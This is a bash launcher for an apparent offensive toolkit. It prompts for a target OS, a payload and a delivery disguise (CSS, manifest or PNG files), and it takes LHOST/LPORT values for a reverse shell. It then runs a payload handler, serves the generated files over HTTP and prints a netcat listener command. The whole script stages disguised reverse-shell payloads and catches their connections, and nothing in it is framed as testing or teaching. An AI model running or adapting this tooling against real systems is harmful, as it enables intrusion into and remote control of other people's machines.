#!/bin/bash
set -euo pipefail

# ==============================
#        ASCII BANNER
# ==============================
cat <<'BANNER'
   ____  _           _       _     ____
  |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __
  | |_) | '_ \ / _ \| __/ __| '_ \| | | |/ _ \/ __/ _ \| '__/ _ \/ _ \| '_ \
  |  __/| | | | (_) | || (__| | | | |_| |  __/ (_| (_) | | |  __/ (_) | | | |
  |_|   |_| |_|\___/ \__\___|_| |_|____/ \___|\___\___/|_|  \___|\___/|_| |_|
BANNER

# ==============================
#        UTILITY FUNCTIONS
# ==============================
log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }

check_dep() {
  for cmd in "$@"; do
    command -v "$cmd" &>/dev/null || { error "Missing dependency: $cmd"; exit 1; }
  done
}
check_dep python3 lsof nc openssl

trap 'cleanup; log "Interrupted. Exiting."; exit 1' INT

# ==============================
#        ENVIRONMENT SETUP
# ==============================
PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$PROJECT_DIR"

CONFIG_FILE="config/settings.json"
OUTPUT_DIR="output"
WEB_DIR="web"
PAYLOADS_DIR="payloads"
STAGERS_DIR="stagers"

mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"

# ==============================
#   SELECT WEB SERVER INTERFACE
# ==============================
log "Available local IPv4 addresses (for web server):"
mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
for i in "${!ip_list[@]}"; do echo "  [$i] ${ip_list[$i]}"; done

while true; do
  read -p "[*] Choose WEB IP [index]: " ip_index
  if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
    WEB_IP="${ip_list[$ip_index]}"
    break
  else
    echo "Invalid index."
  fi
done

read -p "[*] Enter WEB server port (default 8080): " PORT_SERVE
PORT_SERVE="${PORT_SERVE:-8080}"

free_port() {
  local PORT=$1
  local PIDS
  PIDS=$(lsof -i TCP:"$PORT" -sTCP:LISTEN -t 2>/dev/null || true)
  if [[ -n "$PIDS" ]]; then
    log "Port $PORT is in use. Killing PIDs: $PIDS"
    echo "$PIDS" | xargs -r kill -9
    sleep 1
  fi
}
free_port "$PORT_SERVE"

# ==============================
#       PAYLOAD SELECTION
# ==============================
log "Choose target OS:"
select OS in linux windows mac; do [[ -n "$OS" ]]; break; done

PAYLOAD_PATH="$PAYLOADS_DIR/$OS"
[[ -d "$PAYLOAD_PATH" ]] || { error "No payloads for $OS"; exit 1; }

log "Choose payload in $PAYLOAD_PATH:"
mapfile -t PAYLOADS < <(find "$PAYLOAD_PATH" -mindepth 1 -maxdepth 1 -type d -exec basename {} \;)
select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done

log "Choose delivery method:"
select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done

# ==============================
#       LHOST & LPORT INPUT
# ==============================
read -p "[*] Enter LHOST (for reverse shell): " LHOST
read -p "[*] Enter LPORT (for reverse shell, default 8000): " LPORT
LPORT="${LPORT:-8000}"
free_port "$LPORT"

# ==============================
#       Generate AES key
# ==============================
KEY=$(openssl rand -hex 32)
KEY_ESCAPED=$(echo "$KEY" | sed -e 's/[\\/&]/\\\\&/g')

# ==============================
#       CUSTOM HANDLER CALL
# ==============================
CUSTOM_HANDLER="$PAYLOADS_DIR/$OS/$PAYLOAD/handler.sh"
if [[ -f "$CUSTOM_HANDLER" ]]; then
  log "Found custom handler for payload '$PAYLOAD'. Executing..."

  source "$CUSTOM_HANDLER"

  if declare -f custom_payload_handler &>/dev/null; then
    custom_payload_handler "$LHOST" "$LPORT" "$WEB_IP" "$PORT_SERVE" "$DELIVERY" "$PROJECT_DIR" "$OUTPUT_DIR" "$WEB_DIR" "$KEY"
  else
    error "Function 'custom_payload_handler' not defined in handler.sh"
    exit 1
  fi
else
  error "No handler.sh found for payload '$PAYLOAD' under $PAYLOAD_PATH/$PAYLOAD/"
  exit 1
fi

# ==============================
#     START HTTP SERVER
# ==============================
serve_web() {
  cd "$WEB_DIR"
  log "Serving at http://$WEB_IP:$PORT_SERVE"
  python3 -m http.server "$PORT_SERVE" --bind 0.0.0.0 > ../output/http_server.log 2>&1 &
  SERVER_PID=$!
  cd "$PROJECT_DIR"
}
serve_web
sleep 1

# ==============================
#     FINAL LOG OUTPUT
# ==============================
log "Payload generation complete."
echo "  Web delivery root: http://$WEB_IP:$PORT_SERVE/"
echo "  Netcat listener:   nc -lvnp $LPORT"

echo "[$(date)] $WEB_IP $LPORT $PORT_SERVE $OS $PAYLOAD $DELIVERY KEY=$KEY" >> build_history.log

# ==============================
#       CLEANUP HANDLER
# ==============================
cleanup() {
  if [[ -n "${SERVER_PID:-}" ]] && ps -p $SERVER_PID &>/dev/null; then
    log "Stopping HTTP server (PID $SERVER_PID)..."
    kill $SERVER_PID 2>/dev/null || true
  fi
}
trap cleanup EXIT

log "Press Ctrl+C to stop the web server."
while true; do sleep 60; done
